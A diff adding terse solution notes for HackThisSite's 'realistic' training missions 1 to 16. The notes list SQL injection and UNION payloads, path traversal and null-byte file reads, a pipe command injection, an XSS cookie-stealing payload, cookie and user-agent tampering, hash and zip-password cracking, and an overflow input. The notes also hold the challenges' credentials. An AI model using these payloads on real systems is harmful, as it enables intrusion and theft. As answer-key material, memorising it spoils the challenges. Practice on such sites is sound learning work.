@@ -1,0 +1,266 @@
+1) change in code of last command value 5 --> 9999
+
+2) https://www.hackthissite.org/missions/realistic/2/update.php
+  ' OR 1=1 ;
+
+3) https://www.hackthissite.org/missions/realistic/3/oldindex.html
+  submit poetry
+  name of poerm:
+    ../index.html
+  poem:
+    source code of index.html
+
+4) https://www.hackthissite.org/missions/realistic/4/products.php?category=1 UNION ALL SELECT *,*,*,* from email
+go to profile, click on the name
+send to SaveTheWhales email with info that you got
+
+5) https://www.hackthissite.org/missions/realistic/5/robots.txt
+https://www.hackthissite.org/missions/realistic/5/secret/
+https://www.hackthissite.org/missions/realistic/5/secret/admin.bak.php
+1e306f03e19112ff667538f6b0428bce
+go to https://crackstation.net/
+
+6) sum of 3 numbers is ascii code of symbol
+
+f = open('encrypted.txt')
+tmp = []
+arr = []
+c = 0
+for line in f:
+    l = line.split('\n')[0]
+    for i in l.split('.'):
+        if i != '':
+            tmp.append(int(i))
+            c += 1
+            if c%3 == 0:
+                arr.append(sum(tmp))
+                tmp = []
+
+# Brute force
+for diff in range(max(arr)-255, min(arr)+1):
+    fn = 'bruteforce-%s.txt' % diff
+    bf = open(fn, 'w')
+    for i in arr:
+        bf.write(chr(i-diff))
+    bf.close()
+
+send email to ToxiCo_Watch with text
+
+7) find images folder in HTML code
+  https://www.hackthissite.org/missions/realistic/7/showimages.php?file=/images/admin/.htpasswd
+  show source code
+  find hex
+  use john the ripper
+  john text --show
+
+8) register
+   yser info -> search
+   sql:
+      ' OR 1=1 --
+  find 
+  GaryWilliamHunter
+  -- $$$$$ --
+
+  change cookie:
+    GaryWilliamHunter
+    -- $$$$$ --
+  clear:
+    change folder in HTML code
+    value = "logFiles"
+
+9)  login via data that we got
+    private messages (use xss)
+    any name of subject
+    in Message:
+      javascript:void(window.location="document.cookie")
+
+    change our cookies
+    pay salaries
+    go to demo -> folder Downloads -> logs
+    go to mailing list -> change location in code -> .../logs/logs.txt
+    in email write ip from logs 
+
+10) in staff find user with id = 1 (admin) Mrs. Samantha Miller
+    login smiller
+    password bruting - smiller
+    in HTML find file staff.php
+    https://www.hackthissite.org/missions/realistic/10/staff.php
+    install User-Agent Switcher (circle blue icon)
+    Edit this User-Agent string -> holy_teacher
+    restart site
+    change in cookie admin value -> 1
+
+    in HTML find https://www.hackthissite.org/missions/realistic/10/staff.php?action=changegrades&changeaction=modrec&rec=&studentid=1
+
+    https://www.hackthissite.org/missions/realistic/10/staff.php?action=changegrades&changeaction=modrec&rec=&studentid=1&grade=5
+
+    change all
+    
+    staff.php?action=changegrades&changeaction=modrec&rec=0/1/2/3/4/5/6/7/8/9&studentid=1&grade=5
+
+11) ?page=|ls|
+    https://www.hackthissite.org/missions/realistic/11/client_http_docs/
+    check space46
+    therightwayradio
+    rsmith
+    id = 0
+    change password
+    login
+    go to mod
+    change database folder in HTML code -> ../../../bs.dbase
+    SELECT * FROM sqlite_master WHERE type='table';
+    SELECT name FROM sqlite_master WHERE type='table';
+    SELECT * from web_hosting;
+    .../11/admin
+    go to admin panel -> user && password
+    try to download smth -> chamge URL -> https://www.hackthissite.org/missions/realistic/11/admin/d.pl?file=/var/www/budgetserv/html/client_http_docs/space46/
+    https://www.hackthissite.org/missions/realistic/11/admin/d.pl?file=/var/www/budgetserv/html/client_http_docs/space46/src.tar.gz
+
+    He said us about file src.tar.gz
+
+12) we have internet.pl and page.pl
+    go to students -> Joey Simons
+    in HTML -> ../cgi-bin/guest.pl
+    https://www.hackthissite.org/missions/realistic/12/cgi-bin/guest.pl?action=read&file=
+    https://www.hackthissite.org/missions/realistic/12/cgi-bin/guest.pl?action=read&file=guestbook.html
+    https://www.hackthissite.org/missions/realistic/12/cgi-bin/guest.pl?action=read&file=guestbook.txt
+
+    https://www.hackthissite.org/missions/realistic/12/cgi-bin/internet.pl
+    file://C:\
+    file://C:\WEB
+    file://C:\WEB\HTML
+    heartlandadminpanel.html
+    main page -> instead of cgi-bin... -> heartlandadminpanel.html
+    in HTML code cgi-bin/heartlandadminpanel.pl
+
+    https://www.hackthissite.org/missions/realistic/12/cgi-bin/guest.pl?action=read&file=heartlandadminpanel.pl
+
+    in HTML code we can find username
+
+    jbardus
+    heartlandnetworkadministrator
+
+13) click press releases
+    choose 'view'
+    add ? to the end
+    look into the algo -> see md5 from 'Speeches' -> 7e40c181f9221f9c613adf8bb8136ea8
+    next directory 
+    https://www.hackthissite.org/missions/realistic/13/speeches/passwords/7e40c181f9221f9c613adf8bb8136ea8
+    7bc35830abab8fced52657d38ea048df:21232f297a57a5a743894a0e4a801fc3
+    moni1:admin
+    check admin directory
+    They hashed directory earlier, we assume that that did it again
+    hash 'admin'
+    go to directory with hash name of 'admin'
+
+14) with burp we can find how response comes
+    news.cgi?story=.news / news.cgi?story=.news
+
+    https://www.hackthissite.org/missions/realistic/14/news.cgi?story=.%00
+    %00 - it's null, let to know what's in file
+    administrator.cgi moderator.cgi robots.txt
+
+    https://www.hackthissite.org/missions/realistic/14/news.cgi?story=administrator.cgi%00
+    found webpermit/db.cgi
+    insted of / we use %2F
+    so: https://www.hackthissite.org/missions/realistic/14/news.cgi?story=webpermit%2Fdb.cgi%00
+
+    https://www.hackthissite.org/missions/realistic/14/news.cgi?story=moderator.cgi%00
+    see isadmin function
+    go to https://www.hackthissite.org/missions/realistic/14/moderator.cgi -> use isadmin
+    use * to show all
+    login in mail part of site with given log and pass
+
+15) images folder
+    with burp find _backups_ in code
+    go to https://www.hackthissite.org/missions/realistic/15/_backups_/
+    download backup.zip
+    unzip -l backup.zip
+    to crack zip pass use pkcrack (it matches encrpyted file with original (clear) )
+    need to download some files
+    1 - https://www.hackthissite.org/missions/realistic/15/index.htm
+    we use clear index.htm
+    make zip of index -> zip nameofarchive index.htm
+
+    pkcrack -C backup.zip -c "misc (files from different folders)/index.htm" -P newarchive.zip -p "index.htm" -d result.zip -i -a
+
+  ls -lha result.zip 
+    unzip
+    in msgshow find internal_messages.php
+
+    in unziped files we see internal_messages -> it's the folder
+    msgshow -> internal_messages.php
+
+    ...../internal_messages/internal_messages.php
+
+    msgauth -> /files
+    internal_messages/files/
+
+    msgpasswords.txt
+
+    files/msgpasswords.txt
+    see this form ADMIN:PASS
+    in main page see webadmin: Susy Slack
+
+    in https://www.hackthissite.org/missions/realistic/15/internal_messages/internal_messages.php
+    click near admin on READ MESSAGES button
+    in burp we see password=dqgfqgqerg&username=admin
+    send to repeater and add
+    in burp we see password=dqgfqgqerg&username=admin&filename=../index.htm
+
+    username = webadmin
+    password = Susy Slack,
+
+    password=Susy%20Slack&username=webadmin&filename=../../index.htm
+
+    change destination file: insted of msgshow.. set msgauth.php
+    msg_password=Susy%20Slack,&msg_username=admin&filename=../../index.htm
+
+    now we're able to click the button
+    get admin_area folder
+
+    ...../admin_area - forbidden
+    check shell.php in archive
+
+    https://www.hackthissite.org/missions/realistic/15/admin_area/shell.php
+     because of PHP_AUTH_USER vulnerability, we can change the value of it
+     in login area we can write a value for example bgColor and get the value of it
+     print value of password -> go and crack it -> shellPswd_root
+     20010923   9e71fc2a99a71b722ead746b776b25ac -> foobar
+     __________
+     some trash
+
+     go to the test directory and viewpatents.php
+     https://www.hackthissite.org/missions/realistic/15/admin_area/viewpatents.php
+     https://www.hackthissite.org/missions/realistic/15/admin_area/test/
+     from test get zip
+
+     if file from archive we can find classic buffer overflow -> strcpy(concatenated, username)
+     we need to go more than 200 characters
+
+     we need 224 symbols YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY
+
+16) check code -> find index.php?module=admin_login
+    https://www.hackthissite.org/missions/realistic/16/index.php?module=admin_login
+    in burp find GET to .../16/login.swf
+    download file
+    decompile it with flasm
+    flasm login.swf
+    nothing
+    go to the site, try to login
+    in burp (I didn't find) we find config.txt
+    we have auth.php
+    authed=false
+    go to register area
+    after registration in edit my profile in personal message -> auth_page=config.txt&authed=true&
+    register with .. name 
+    change in edit again
+    person mes -> auth_page=config.txt&authed=true&
+    current email -> ..
+    https://www.hackthissite.org/missions/realistic/16/config.txt
+    login with any data in admin
+    try to change email
+    in burp get file -> check_email.swf
+    in check_email search for .php
+    copy check_email.php?auth=true&id=63a4bf12cd&email=
+    check_email.php?auth=true&id=63a4bf12cd&email=jenn@simplemail.com
